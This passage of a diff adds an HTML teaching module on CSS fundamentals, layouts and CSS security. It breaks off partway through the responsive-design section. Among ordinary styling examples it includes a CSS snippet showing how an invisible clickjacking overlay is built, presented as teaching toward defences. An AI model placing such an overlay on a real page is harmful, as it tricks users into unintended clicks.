@@ -1,0 +1,1884 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>CSS & Responsive Design – Teaching Module</title>
+<style>
+  body {
+    font-family: Arial, sans-serif;
+    font-size: 11pt;
+    line-height: 1.6;
+    color: #1a1a1a;
+    max-width: 880px;
+    margin: 0 auto;
+    padding: 32px 40px;
+    background: #fff;
+  }
+  .copy-banner {
+    background: #1F3A6E;
+    color: white;
+    padding: 14px 20px;
+    border-radius: 6px;
+    margin-bottom: 30px;
+    font-size: 10pt;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+  }
+  .copy-banner span { font-size: 18px; }
+  .copy-banner strong { font-size: 11pt; }
+  .paste-marker {
+    background: #E8F4FD;
+    border: 2px dashed #1F3A6E;
+    border-radius: 6px;
+    padding: 10px 16px;
+    margin: 24px 0 8px 0;
+    font-size: 10pt;
+    color: #1F3A6E;
+    font-weight: bold;
+  }
+  h1.module-title {
+    font-size: 22pt;
+    font-weight: bold;
+    color: #1F3A6E;
+    margin: 16px 0 4px 0;
+    border-bottom: 3px solid #1F3A6E;
+    padding-bottom: 8px;
+  }
+  h2.day-heading {
+    font-size: 15pt;
+    font-weight: bold;
+    color: #1F3A6E;
+    margin: 28px 0 10px 0;
+    border-bottom: 2px solid #E8931F;
+    padding-bottom: 4px;
+  }
+  h3.session-heading {
+    font-size: 12pt;
+    font-weight: bold;
+    color: #1F3A6E;
+    margin: 20px 0 6px 0;
+  }
+  h4.topic-heading {
+    font-size: 11pt;
+    font-weight: bold;
+    color: #333;
+    margin: 14px 0 4px 0;
+  }
+  p { margin: 6px 0 10px 0; }
+  .box-blue  { background:#E8F4FD; border-left:5px solid #1F3A6E; border-radius:4px; padding:12px 16px; margin:12px 0; }
+  .box-orange{ background:#FEF6E8; border-left:5px solid #E8931F; border-radius:4px; padding:12px 16px; margin:12px 0; }
+  .box-green { background:#EAF7EC; border-left:5px solid #2E7D32; border-radius:4px; padding:12px 16px; margin:12px 0; }
+  .box-red   { background:#FDECEA; border-left:5px solid #C62828; border-radius:4px; padding:12px 16px; margin:12px 0; }
+  .step-block {
+    background: #F5F7FA;
+    border: 1px solid #D0D8E8;
+    border-radius: 6px;
+    padding: 14px 18px;
+    margin: 12px 0;
+  }
+  .step-block .step-label {
+    font-weight: bold;
+    color: #1F3A6E;
+    font-size: 10pt;
+    text-transform: uppercase;
+    letter-spacing: 0.5px;
+    margin-bottom: 8px;
+  }
+
+  /* ── CSS CODE BLOCKS ── */
+  .code-block {
+    background: #1a1a2e;
+    color: #e0e0e0;
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 9.5pt;
+    border-radius: 5px;
+    padding: 14px 18px;
+    margin: 10px 0;
+    line-height: 1.9;
+    white-space: pre;
+    overflow-x: auto;
+  }
+  /* colour roles inside code blocks */
+  .code-block .sel  { color: #64B5F6; }  /* selectors — blue */
+  .code-block .prop { color: #CE93D8; }  /* properties — purple */
+  .code-block .val  { color: #A5D6A7; }  /* values — green */
+  .code-block .cmt  { color: #78909C; }  /* comments — grey */
+  .code-block .atr  { color: #FFD54F; }  /* at-rules / media — amber */
+  .code-block .bad  { color: #EF9A9A; }  /* dangerous code — red */
+  .code-block .good { color: #80CBC4; }  /* safe code — teal */
+  .code-block .num  { color: #FFD54F; }  /* numbers */
+
+  /* ── OBJECTIVE BOX ── */
+  .objective-box {
+    background: #F0F4FF;
+    border: 2px solid #1F3A6E;
+    border-radius: 6px;
+    padding: 14px 18px;
+    margin: 14px 0;
+  }
+  .objective-box .obj-title {
+    font-weight: bold;
+    color: #1F3A6E;
+    font-size: 11pt;
+    margin-bottom: 8px;
+  }
+  .objective-box ol { margin: 4px 0 0 18px; padding: 0; }
+  .objective-box ol li { margin-bottom: 4px; }
+
+  /* ── SIDE-BY-SIDE COMPARISON ── */
+  .compare-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 12px;
+    margin: 12px 0;
+  }
+  .compare-bad  { background:#1a1a2e; border:2px solid #C62828; border-radius:5px; padding:12px 14px; }
+  .compare-good { background:#1a1a2e; border:2px solid #2E7D32; border-radius:5px; padding:12px 14px; }
+  .compare-label {
+    font-family: 'Courier New', monospace;
+    font-size: 9pt;
+    font-weight: bold;
+    margin-bottom: 6px;
+    padding: 2px 8px;
+    border-radius: 3px;
+    display: inline-block;
+  }
+  .label-bad  { background:#C62828; color:white; }
+  .label-good { background:#2E7D32; color:white; }
+  .compare-bad  pre,
+  .compare-good pre {
+    color: #e0e0e0;
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 9pt;
+    line-height: 1.8;
+    margin: 4px 0 0 0;
+    white-space: pre;
+    overflow-x: auto;
+  }
+
+  /* ── INLINE CODE ── */
+  code {
+    background: #EEF2F8;
+    color: #1F3A6E;
+    font-family: 'Courier New', Courier, monospace;
+    font-size: 10pt;
+    padding: 1px 5px;
+    border-radius: 3px;
+  }
+
+  /* ── DURATION PILLS ── */
+  .duration {
+    display: inline-block;
+    background: #E8931F;
+    color: white;
+    font-size: 9pt;
+    font-weight: bold;
+    padding: 2px 9px;
+    border-radius: 12px;
+    margin-left: 8px;
+    vertical-align: middle;
+  }
+
+  /* ── META ROW ── */
+  .meta-row  { display:flex; gap:20px; flex-wrap:wrap; margin:8px 0 16px 0; }
+  .meta-pill { background:#EEF2F8; border-radius:20px; padding:4px 14px; font-size:10pt; color:#1F3A6E; font-weight:bold; }
+
+  ul  { margin: 6px 0 10px 20px; padding: 0; }
+  li  { margin-bottom: 5px; }
+
+  /* how-box: shows HOW the objective is achieved */
+  .how-box {
+    background: #FFFDE7;
+    border-left: 5px solid #F9A825;
+    border-radius: 4px;
+    padding: 10px 16px;
+    margin: 8px 0 14px 0;
+    font-size: 10.5pt;
+  }
+  .how-box strong { color: #E65100; }
+</style>
+</head>
+<body>
+
+<!-- ── COPY BANNER ── -->
+<div class="copy-banner">
+  <span>📋</span>
+  <div>
+    <strong>To paste into Google Docs:</strong>
+    Press <strong>Ctrl+A</strong> (or <strong>Cmd+A</strong> on Mac) to select all → <strong>Ctrl+C</strong> to copy → open your Google Doc → <strong>Ctrl+V</strong> to paste.
+  </div>
+</div>
+
+<div class="paste-marker">📌 PASTE LOCATION — Insert below Week 1 (HTML) in your Level 1 document. Day 1 starts here.</div>
+
+<!-- ── MODULE HEADER ── -->
+<h1 class="module-title">Week 2: Cascading Style Sheets (CSS), Responsive Design &amp; CSS Security</h1>
+
+<div class="meta-row">
+  <span class="meta-pill">📅 Duration: 2 Days (16 Hours)</span>
+  <span class="meta-pill">🔬 Labs: 13 Hours</span>
+  <span class="meta-pill">📖 Theory: 3 Hours</span>
+  <span class="meta-pill">✅ Prerequisite: Week 1 HTML complete</span>
+</div>
+
+<div class="box-blue">
+  <strong>Module Overview:</strong> This week students move from HTML structure into visual presentation and security-aware styling. Day 1 covers how CSS works, how layouts are built with Flexbox and Grid, and how designs adapt to every screen size. Day 2 focuses entirely on the security dimension — CSS as an attack surface, CSS injection, CSS-based data exfiltration, and four layers of clickjacking defence. Every theory section is paired with working code examples so students see exactly what each concept looks like in practice.
+</div>
+
+<!-- ── WEEK OBJECTIVES ── -->
+<div class="objective-box">
+  <div class="obj-title">🎯 Week Objectives — By the End of This Week Students Will Be Able To:</div>
+  <ol>
+    <li>Explain the cascade, specificity hierarchy, and the CSS box model with confidence</li>
+    <li>Apply core CSS properties for colour, typography, layout, and positioning correctly</li>
+    <li>Build one-dimensional layouts using Flexbox — navigation bars, card rows, centred content</li>
+    <li>Build two-dimensional page layouts using CSS Grid — page templates, galleries, dashboard grids</li>
+    <li>Write mobile-first responsive CSS using media queries at standard breakpoints</li>
+    <li>Transform an unstyled HTML portfolio into a fully responsive, professional multi-page website</li>
+    <li>Explain how CSS injection, CSS keylogger attacks, and attribute-selector data exfiltration work</li>
+    <li>Implement all four layers of clickjacking defence on a real web page</li>
+    <li>Identify and fix CSS security vulnerabilities in provided code scenarios</li>
+    <li>Write a structured vulnerability report documenting clickjacking protection findings</li>
+  </ol>
+</div>
+
+<!-- ===========================================
+     DAY 1
+     =========================================== -->
+<h2 class="day-heading">Day 1 — CSS Fundamentals, Layouts &amp; Responsive Design <span class="duration">8 Hours</span></h2>
+
+<h3 class="session-heading">Theory Session <span class="duration">2 Hours</span></h3>
+
+<p>Theory is delivered from the front of the room. The instructor types every example live in the browser so students see the visual result immediately. Students take notes and follow along — there is no lab task in this session. Every concept here is used directly in Lab 1 and Lab 2 that follow.</p>
+
+<!-- ─────────────────── 1.1 ─────────────────── -->
+<h4 class="topic-heading">1.1 — What is CSS and Why Does It Matter for Security? <span class="duration">20 min</span></h4>
+
+<div class="objective-box">
+  <div class="obj-title">🎯 Objective</div>
+  <p style="margin:4px 0;">Students understand the three ways to add CSS, the cascade and specificity rules that determine which style wins, and the box model that underlies every element's layout — including why box-model knowledge is essential for understanding clickjacking.</p>
+</div>
+
+<div class="how-box">
+  <strong>How it is achieved:</strong> The instructor demonstrates each CSS delivery method live, then edits the same element with rules of increasing specificity so students watch the winning rule change in real time. The box model is drawn and then recreated in code so students see the nested rectangles rendered in a browser.
+</div>
+
+<p>CSS is the language that controls how an HTML page looks — colours, sizes, spacing, layout, and animation. HTML defines structure and meaning; CSS defines appearance. The two are intentionally separate, and keeping them separate is a security principle as well as a design principle.</p>
+
+<p><strong>The three ways to add CSS — in order of preference:</strong></p>
+
+<div class="code-block"><span class="cmt">/* ── METHOD 1: INLINE (least preferred) ──────────────────────────── */</span>
+<span class="cmt">/* Written directly on the element. Hardest to maintain,</span>
+<span class="cmt">   and makes Content Security Policy (CSP) enforcement difficult. */</span>
+&lt;p <span class="prop">style</span>=<span class="val">"color: red; font-size: 18px;"</span>&gt;Text&lt;/p&gt;
+
+<span class="cmt">/* ── METHOD 2: INTERNAL (single-page demos only) ─────────────────── */</span>
+&lt;head&gt;
+  &lt;<span class="sel">style</span>&gt;
+    <span class="sel">p</span> { <span class="prop">color</span>: <span class="val">red</span>; <span class="prop">font-size</span>: <span class="val">18px</span>; }
+  &lt;/<span class="sel">style</span>&gt;
+&lt;/head&gt;
+
+<span class="cmt">/* ── METHOD 3: EXTERNAL (professional standard ✓) ────────────────── */</span>
+<span class="cmt">/* In the HTML head — one file shared by all pages */</span>
+&lt;link <span class="prop">rel</span>=<span class="val">"stylesheet"</span> <span class="prop">href</span>=<span class="val">"styles.css"</span>&gt;
+
+<span class="cmt">/* In styles.css */</span>
+<span class="sel">p</span> { <span class="prop">color</span>: <span class="val">red</span>; <span class="prop">font-size</span>: <span class="val">18px</span>; }
+</div>
+
+<p><strong>Specificity — which rule wins when multiple rules target the same element:</strong></p>
+
+<div class="code-block"><span class="cmt">/* Specificity order — from lowest to highest priority */</span>
+
+<span class="sel">p</span>           { <span class="prop">color</span>: <span class="val">black</span>;  }  <span class="cmt">/* Element selector        — lowest  (0,0,1) */</span>
+<span class="sel">.highlight</span>  { <span class="prop">color</span>: <span class="val">blue</span>;   }  <span class="cmt">/* Class selector          — medium  (0,1,0) */</span>
+<span class="sel">#headline</span>   { <span class="prop">color</span>: <span class="val">green</span>;  }  <span class="cmt">/* ID selector             — high    (1,0,0) */</span>
+<span class="cmt">/*             style="…"       — Inline style            — highest (1,0,0,0) */</span>
+<span class="cmt">/*             color: red !important — Overrides all — use sparingly */</span>
+
+<span class="cmt">/* Example: this paragraph has class="highlight" and id="headline"</span>
+<span class="cmt">   The ID rule wins — the text is green */</span>
+&lt;p <span class="prop">class</span>=<span class="val">"highlight"</span> <span class="prop">id</span>=<span class="val">"headline"</span>&gt;Which colour wins?&lt;/p&gt;
+</div>
+
+<p><strong>The Box Model — every element is a nested set of rectangles:</strong></p>
+
+<div class="code-block"><span class="cmt">/* Box model — from inside out: content → padding → border → margin */</span>
+
+<span class="sel">.card</span> {
+  <span class="prop">width</span>:          <span class="val">300px</span>;    <span class="cmt">/* content area width */</span>
+  <span class="prop">padding</span>:        <span class="val">20px</span>;     <span class="cmt">/* space INSIDE the border */</span>
+  <span class="prop">border</span>:         <span class="val">2px solid #1F3A6E</span>;  <span class="cmt">/* the border line */</span>
+  <span class="prop">margin</span>:         <span class="val">16px</span>;     <span class="cmt">/* space OUTSIDE the border */</span>
+
+  <span class="cmt">/* box-sizing: border-box makes width include padding + border */</span>
+  <span class="cmt">/* Without it, a 300px element + 20px padding = 340px total — confusing */</span>
+  <span class="prop">box-sizing</span>:     <span class="val">border-box</span>;   <span class="cmt">/* ← always set this globally */</span>
+}
+
+<span class="cmt">/* Apply border-box to EVERYTHING — write this at the top of every CSS file */</span>
+<span class="sel">*, *::before, *::after</span> {
+  <span class="prop">box-sizing</span>: <span class="val">border-box</span>;
+  <span class="prop">margin</span>:     <span class="val">0</span>;
+  <span class="prop">padding</span>:    <span class="val">0</span>;
+}
+</div>
+
+<div class="box-red">
+  <strong>Security Connection — Box Model &amp; Clickjacking:</strong> An attacker can position a transparent element with an extremely high <code>z-index</code> exactly over a visible button. The user sees the visible button, but their click lands on the invisible overlay. Understanding the box model and <code>position</code> + <code>z-index</code> is essential for understanding this attack — it is covered in full in the Day 2 theory and Lab 4.
+</div>
+
+<!-- ─────────────────── 1.2 ─────────────────── -->
+<h4 class="topic-heading">1.2 — Core CSS Properties <span class="duration">30 min</span></h4>
+
+<div class="objective-box">
+  <div class="obj-title">🎯 Objective</div>
+  <p style="margin:4px 0;">Students can write CSS for colour, typography, display behaviour, and positioning — including understanding why <code>opacity: 0</code> and high <code>z-index</code> are clickjacking enablers.</p>
+</div>
+
+<div class="how-box">
+  <strong>How it is achieved:</strong> Properties are grouped by purpose rather than listed alphabetically. Each group is demonstrated live with a visible before-and-after on screen. The positioning section ends with a live demonstration of an absolutely-positioned transparent overlay so students see the attack mechanism before they learn the defence.
+</div>
+
+<p><strong>Colours and Backgrounds:</strong></p>
+
+<div class="code-block"><span class="sel">.example</span> {
+  <span class="cmt">/* Named colour */</span>
+  <span class="prop">color</span>:              <span class="val">tomato</span>;
+
+  <span class="cmt">/* Hex — precise colour matching */</span>
+  <span class="prop">background-color</span>:   <span class="val">#1F3A6E</span>;
+
+  <span class="cmt">/* RGB */</span>
+  <span class="prop">border-color</span>:       <span class="val">rgb(31, 58, 110)</span>;
+
+  <span class="cmt">/* RGBA — the fourth value is opacity: 0 = fully transparent, 1 = fully opaque */</span>
+  <span class="prop">background-color</span>:   <span class="val">rgba(31, 58, 110, 0.15)</span>;   <span class="cmt">/* 15% opaque — nearly invisible */</span>
+
+  <span class="cmt">/* Linear gradient */</span>
+  <span class="prop">background</span>: <span class="val">linear-gradient(135deg, #1F3A6E, #E8931F)</span>;
+
+  <span class="cmt">/* Background image */</span>
+  <span class="prop">background-image</span>:   <span class="val">url('hero.jpg')</span>;
+  <span class="prop">background-size</span>:    <span class="val">cover</span>;
+  <span class="prop">background-position</span>:<span class="val">center</span>;
+}
+</div>
+
+<p><strong>Typography:</strong></p>
+
+<div class="code-block"><span class="sel">body</span> {
+  <span class="prop">font-family</span>: <span class="val">'Inter', Arial, sans-serif</span>; <span class="cmt">/* fallback chain */</span>
+  <span class="prop">font-size</span>:   <span class="val">16px</span>;          <span class="cmt">/* base — all rem values are relative to this */</span>
+  <span class="prop">line-height</span>: <span class="val">1.6</span>;           <span class="cmt">/* unitless: 1.6 × font-size */</span>
+  <span class="prop">color</span>:       <span class="val">#1a1a1a</span>;
+}
+
+<span class="sel">h1</span> { <span class="prop">font-size</span>: <span class="val">2.5rem</span>; }    <span class="cmt">/* 2.5 × 16px = 40px */</span>
+<span class="sel">h2</span> { <span class="prop">font-size</span>: <span class="val">2rem</span>;   }    <span class="cmt">/* 32px */</span>
+<span class="sel">h3</span> { <span class="prop">font-size</span>: <span class="val">1.5rem</span>; }    <span class="cmt">/* 24px */</span>
+<span class="sel">p</span>  { <span class="prop">font-size</span>: <span class="val">1rem</span>;   }    <span class="cmt">/* 16px — matches base */</span>
+
+<span class="cmt">/* rem vs px: rem scales when the user increases their browser font size;
+   px is fixed. Use rem for accessible, responsive typography. */</span>
+
+<span class="sel">a</span> {
+  <span class="prop">color</span>:            <span class="val">#E8931F</span>;
+  <span class="prop">text-decoration</span>:  <span class="val">none</span>;
+  <span class="prop">transition</span>:       <span class="val">color 0.2s ease</span>;
+}
+<span class="sel">a:hover</span> { <span class="prop">color</span>: <span class="val">#1F3A6E</span>; }
+</div>
+
+<p><strong>Display and Positioning:</strong></p>
+
+<div class="code-block"><span class="cmt">/* ── DISPLAY VALUES ───────────────────────────────────────────── */</span>
+
+<span class="sel">.block-element</span>    { <span class="prop">display</span>: <span class="val">block</span>; }   <span class="cmt">/* full width, starts on new line */</span>
+<span class="sel">.inline-element</span>   { <span class="prop">display</span>: <span class="val">inline</span>; }  <span class="cmt">/* width = content, no line break */</span>
+<span class="sel">.hidden-element</span>   { <span class="prop">display</span>: <span class="val">none</span>; }    <span class="cmt">/* removed from page entirely */</span>
+
+<span class="cmt">/* ── POSITION VALUES ──────────────────────────────────────────── */</span>
+
+<span class="sel">.static</span>   { <span class="prop">position</span>: <span class="val">static</span>; }   <span class="cmt">/* default — follows document flow */</span>
+<span class="sel">.relative</span> { <span class="prop">position</span>: <span class="val">relative</span>; } <span class="cmt">/* moves FROM its normal position */</span>
+<span class="sel">.absolute</span> { <span class="prop">position</span>: <span class="val">absolute</span>; } <span class="cmt">/* removed from flow, placed inside nearest
+                                      positioned ancestor */</span>
+<span class="sel">.fixed</span>    { <span class="prop">position</span>: <span class="val">fixed</span>; }    <span class="cmt">/* placed relative to viewport, stays on scroll */</span>
+<span class="sel">.sticky</span>   { <span class="prop">position</span>: <span class="val">sticky</span>; }   <span class="cmt">/* relative until scroll threshold, then fixed */</span>
+
+<span class="cmt">/* ── z-index — controls stacking order ───────────────────────── */</span>
+<span class="cmt">/* Higher z-index = on top. Only works on positioned elements. */</span>
+
+<span class="sel">.bottom-layer</span> { <span class="prop">position</span>: <span class="val">relative</span>; <span class="prop">z-index</span>: <span class="val">1</span>; }
+<span class="sel">.top-layer</span>    { <span class="prop">position</span>: <span class="val">absolute</span>; <span class="prop">z-index</span>: <span class="val">999</span>; }
+
+<span class="cmt">/* ── CLICKJACKING MECHANISM — how the attack is set up ───────── */</span>
+<span class="cmt">/* An attacker creates this invisible overlay over a real button: */</span>
+
+<span class="sel">.invisible-trap</span> {
+  <span class="prop">position</span>:      <span class="val">absolute</span>;
+  <span class="prop">top</span>:           <span class="val">0</span>;
+  <span class="prop">left</span>:          <span class="val">0</span>;
+  <span class="prop">width</span>:         <span class="val">100%</span>;
+  <span class="prop">height</span>:        <span class="val">100%</span>;
+  <span class="prop">opacity</span>:       <span class="val">0.01</span>;    <span class="cmt">/* nearly invisible — but still receives clicks */</span>
+  <span class="prop">z-index</span>:       <span class="val">9999</span>;   <span class="cmt">/* sits on top of everything visible */</span>
+}
+<span class="cmt">/* The user sees the content below; clicks land on this invisible element above */</span>
+</div>
+
+<div class="box-red">
+  <strong>Security Alert:</strong> <code>opacity: 0</code> makes an element invisible but it still occupies space and still receives click events. A fully transparent element at a high <code>z-index</code> is the core mechanism of clickjacking. Day 2 Lab 4 teaches all four defence layers that prevent this.
+</div>
+
+<!-- ─────────────────── 1.3 ─────────────────── -->
+<h4 class="topic-heading">1.3 — Flexbox: One-Dimensional Layouts <span class="duration">30 min</span></h4>
+
+<div class="objective-box">
+  <div class="obj-title">🎯 Objective</div>
+  <p style="margin:4px 0;">Students can build navigation bars, card rows, and centred content blocks using Flexbox container and item properties — without using floats, tables, or position hacks.</p>
+</div>
+
+<div class="how-box">
+  <strong>How it is achieved:</strong> The instructor builds a navigation bar live from scratch using Flexbox, narrating each property as it is added. Students watch the layout shift on screen with each line. Then the instructor builds a responsive card row, showing how <code>flex-wrap</code> automatically reflows cards on a narrow screen.
+</div>
+
+<div class="code-block"><span class="cmt">/* ── FLEX CONTAINER PROPERTIES ──────────────────────────────────── */</span>
+
+<span class="sel">.nav</span> {
+  <span class="prop">display</span>:         <span class="val">flex</span>;           <span class="cmt">/* makes children into flex items */</span>
+  <span class="prop">flex-direction</span>:  <span class="val">row</span>;            <span class="cmt">/* row (default) | column */</span>
+  <span class="prop">justify-content</span>: <span class="val">space-between</span>;  <span class="cmt">/* along main axis: start | end | center |
+                                       space-between | space-around */</span>
+  <span class="prop">align-items</span>:     <span class="val">center</span>;         <span class="cmt">/* along cross axis: stretch | center |
+                                       flex-start | flex-end | baseline */</span>
+  <span class="prop">flex-wrap</span>:       <span class="val">wrap</span>;           <span class="cmt">/* items wrap to next line if no room */</span>
+  <span class="prop">gap</span>:             <span class="val">16px</span>;           <span class="cmt">/* space between items — cleaner than margins */</span>
+}
+
+<span class="cmt">/* ── FLEX ITEM PROPERTIES ────────────────────────────────────────── */</span>
+
+<span class="sel">.nav-link</span> {
+  <span class="prop">flex-grow</span>:   <span class="val">0</span>;     <span class="cmt">/* 0 = don't grow, 1 = take available space */</span>
+  <span class="prop">flex-shrink</span>: <span class="val">1</span>;     <span class="cmt">/* 1 = can shrink, 0 = never shrink */</span>
+  <span class="prop">flex-basis</span>:  <span class="val">auto</span>;  <span class="cmt">/* starting size before grow/shrink */</span>
+  <span class="cmt">/* shorthand: flex: grow shrink basis */</span>
+  <span class="prop">flex</span>: <span class="val">0 1 auto</span>;
+}
+
+<span class="sel">.card</span>  { <span class="prop">flex</span>: <span class="val">1 1 280px</span>; }  <span class="cmt">/* grows, shrinks, minimum 280px wide */</span>
+
+<span class="cmt">/* ── EXAMPLE: REAL NAVIGATION BAR ───────────────────────────────── */</span>
+<span class="cmt">/*
+  HTML:
+  &lt;header class="site-header"&gt;
+    &lt;div class="logo"&gt;SQI&lt;/div&gt;
+    &lt;nav class="nav"&gt;
+      &lt;a href="#"&gt;Home&lt;/a&gt;
+      &lt;a href="#"&gt;About&lt;/a&gt;
+      &lt;a href="#"&gt;Projects&lt;/a&gt;
+      &lt;a href="#"&gt;Contact&lt;/a&gt;
+    &lt;/nav&gt;
+  &lt;/header&gt;
+*/</span>
+
+<span class="sel">.site-header</span> {
+  <span class="prop">display</span>:         <span class="val">flex</span>;
+  <span class="prop">justify-content</span>: <span class="val">space-between</span>;
+  <span class="prop">align-items</span>:     <span class="val">center</span>;
+  <span class="prop">padding</span>:         <span class="val">0 24px</span>;
+  <span class="prop">height</span>:          <span class="val">64px</span>;
+  <span class="prop">background</span>:      <span class="val">#1F3A6E</span>;
+}
+
+<span class="sel">.nav</span> {
+  <span class="prop">display</span>: <span class="val">flex</span>;
+  <span class="prop">gap</span>:     <span class="val">24px</span>;
+}
+
+<span class="sel">.nav a</span> {
+  <span class="prop">color</span>:           <span class="val">white</span>;
+  <span class="prop">text-decoration</span>: <span class="val">none</span>;
+  <span class="prop">padding</span>:         <span class="val">8px 12px</span>;
+  <span class="prop">border-radius</span>:   <span class="val">4px</span>;
+  <span class="prop">transition</span>:      <span class="val">background 0.2s ease</span>;
+}
+<span class="sel">.nav a:hover</span>            { <span class="prop">background</span>: <span class="val">rgba(255,255,255,0.15)</span>; }
+<span class="sel">.nav a[aria-current="page"]</span> { <span class="prop">background</span>: <span class="val">#E8931F</span>; }
+
+<span class="cmt">/* ── CENTERING — the classic flexbox trick ──────────────────────── */</span>
+<span class="sel">.center-both</span> {
+  <span class="prop">display</span>:         <span class="val">flex</span>;
+  <span class="prop">justify-content</span>: <span class="val">center</span>;
+  <span class="prop">align-items</span>:     <span class="val">center</span>;
+  <span class="prop">min-height</span>:      <span class="val">100vh</span>;   <span class="cmt">/* full viewport height */</span>
+}
+</div>
+
+<div class="box-green">
+  <strong>When to Use Flexbox:</strong> A navigation bar with items spaced evenly. A row of cards that wraps automatically. Centering a single element on the page. Any layout that flows in one direction at a time — either a row or a column, but not both simultaneously.
+</div>
+
+<!-- ─────────────────── 1.4 ─────────────────── -->
+<h4 class="topic-heading">1.4 — CSS Grid: Two-Dimensional Layouts <span class="duration">25 min</span></h4>
+
+<div class="objective-box">
+  <div class="obj-title">🎯 Objective</div>
+  <p style="margin:4px 0;">Students can define a Grid with named areas, place elements precisely in both rows and columns, and use <code>auto-fit</code> with <code>minmax()</code> to create responsive grids that adapt their column count automatically.</p>
+</div>
+
+<div class="how-box">
+  <strong>How it is achieved:</strong> The instructor builds a complete page skeleton (header, sidebar, main, footer) live using named grid areas, then shows how a single <code>minmax()</code> line creates a fully responsive image gallery — no media query needed.
+</div>
+
+<div class="code-block"><span class="cmt">/* ── GRID FUNDAMENTALS ──────────────────────────────────────────── */</span>
+
+<span class="sel">.page-layout</span> {
+  <span class="prop">display</span>:               <span class="val">grid</span>;
+  <span class="prop">grid-template-columns</span>: <span class="val">240px 1fr</span>;             <span class="cmt">/* sidebar | main */</span>
+  <span class="prop">grid-template-rows</span>:    <span class="val">64px 1fr 80px</span>;          <span class="cmt">/* header | content | footer */</span>
+  <span class="prop">gap</span>:                   <span class="val">16px</span>;
+  <span class="prop">min-height</span>:            <span class="val">100vh</span>;
+
+  <span class="cmt">/* fr = fraction of available space */</span>
+  <span class="cmt">/* 1fr fills whatever is left after fixed columns are placed */</span>
+}
+
+<span class="cmt">/* ── NAMED TEMPLATE AREAS ─────────────────────────────────────── */</span>
+<span class="sel">.full-layout</span> {
+  <span class="prop">display</span>:               <span class="val">grid</span>;
+  <span class="prop">grid-template-columns</span>: <span class="val">240px 1fr</span>;
+  <span class="prop">grid-template-rows</span>:    <span class="val">auto 1fr auto</span>;
+  <span class="prop">grid-template-areas</span>:
+    <span class="val">"header  header"</span>
+    <span class="val">"sidebar main  "</span>
+    <span class="val">"footer  footer"</span>;
+  <span class="prop">min-height</span>: <span class="val">100vh</span>;
+  <span class="prop">gap</span>:        <span class="val">0</span>;
+}
+
+<span class="sel">header</span>  { <span class="prop">grid-area</span>: <span class="val">header</span>;  }
+<span class="sel">aside</span>   { <span class="prop">grid-area</span>: <span class="val">sidebar</span>; }
+<span class="sel">main</span>    { <span class="prop">grid-area</span>: <span class="val">main</span>;    }
+<span class="sel">footer</span>  { <span class="prop">grid-area</span>: <span class="val">footer</span>;  }
+
+<span class="cmt">/* ── RESPONSIVE GALLERY — auto-fit + minmax ───────────────────── */</span>
+<span class="cmt">/* No media query needed — columns add/remove automatically */</span>
+<span class="sel">.gallery</span> {
+  <span class="prop">display</span>:               <span class="val">grid</span>;
+  <span class="prop">grid-template-columns</span>: <span class="val">repeat(auto-fit, minmax(280px, 1fr))</span>;
+  <span class="cmt">/*                                        ↑ min width  ↑ max */</span>
+  <span class="cmt">/* On 1200px screen → 4 columns  |  On 600px screen → 2 columns */</span>
+  <span class="cmt">/* On 320px screen  → 1 column   — all automatic                */</span>
+  <span class="prop">gap</span>: <span class="val">24px</span>;
+}
+
+<span class="cmt">/* ── SPANNING CELLS ───────────────────────────────────────────── */</span>
+<span class="sel">.featured-item</span> {
+  <span class="prop">grid-column</span>: <span class="val">span 2</span>;  <span class="cmt">/* stretches across 2 columns */</span>
+  <span class="prop">grid-row</span>:    <span class="val">span 2</span>;  <span class="cmt">/* stretches across 2 rows */</span>
+}
+
+<span class="cmt">/* ── REPEAT SHORTHAND ─────────────────────────────────────────── */</span>
+<span class="sel">.three-col</span> {
+  <span class="prop">grid-template-columns</span>: <span class="val">repeat(3, 1fr)</span>;  <span class="cmt">/* 3 equal columns */</span>
+}
+</div>
+
+<div class="box-orange">
+  <strong>Flexbox vs Grid — When to Use Which:</strong> Use Flexbox when content flows in one direction: a navigation row, a column of form fields, a row of cards. Use Grid when you need precise control of both rows and columns at the same time: a full page layout, a photo gallery with featured items, a dashboard. Many real pages use Grid for the outer shell and Flexbox inside each Grid area.
+</div>
+
+<!-- ─────────────────── 1.5 ─────────────────── -->
+<h4 class="topic-heading">1.5 — Responsive Design &amp; Media Queries <span class="duration">25 min</span></h4>
+
+<div class="objective-box">
+  <div class="obj-title">🎯 Objective</div>
+  <p style="margin:4px 0;">Students write mobile-first CSS using min-width media queries at four standard breakpoints, understand why the viewport meta tag is required, and can explain how responsive units like <code>rem</code>, <code>vw</code>, and <code>clamp()</code> work.</p>
+</div>
+
+<div class="how-box">
+  <strong>How it is achieved:</strong> The instructor opens a two-column layout with no media queries and resizes the browser window so students watch it break. They then add media queries one at a time and watch the layout recover at each breakpoint. The DevTools device toolbar is used throughout.
+</div>
+
+<div class="code-block"><span class="cmt">/* ── STEP 1: Viewport meta tag — required in every HTML file ──── */</span>
+<span class="cmt">/* Without this, mobile browsers render at 980px then zoom out */</span>
+&lt;meta <span class="prop">name</span>=<span class="val">"viewport"</span> <span class="prop">content</span>=<span class="val">"width=device-width, initial-scale=1"</span>&gt;
+
+<span class="cmt">/* ── STEP 2: Mobile-first base styles ────────────────────────── */</span>
+<span class="cmt">/* Write for the smallest screen first — no media query needed */</span>
+
+<span class="sel">.site-header</span> {
+  <span class="prop">display</span>:        <span class="val">flex</span>;
+  <span class="prop">flex-direction</span>: <span class="val">column</span>;  <span class="cmt">/* stack logo above nav on mobile */</span>
+  <span class="prop">padding</span>:        <span class="val">12px 16px</span>;
+}
+
+<span class="sel">.skills-grid</span> {
+  <span class="prop">display</span>: <span class="val">grid</span>;
+  <span class="prop">grid-template-columns</span>: <span class="val">1fr</span>;  <span class="cmt">/* single column on mobile */</span>
+  <span class="prop">gap</span>: <span class="val">16px</span>;
+}
+
+<span class="sel">h1</span> { <span class="prop">font-size</span>: <span class="val">1.8rem</span>; }  <span class="cmt">/* smaller heading on phone */</span>
+
+<span class="cmt">/* ── STEP 3: Tablet — 768px and wider ───────────────────────── */</span>
+<span class="atr">@media</span> (min-width: <span class="val">768px</span>) {
+
+  <span class="sel">.site-header</span> {
+    <span class="prop">flex-direction</span>: <span class="val">row</span>;    <span class="cmt">/* logo and nav side by side */</span>
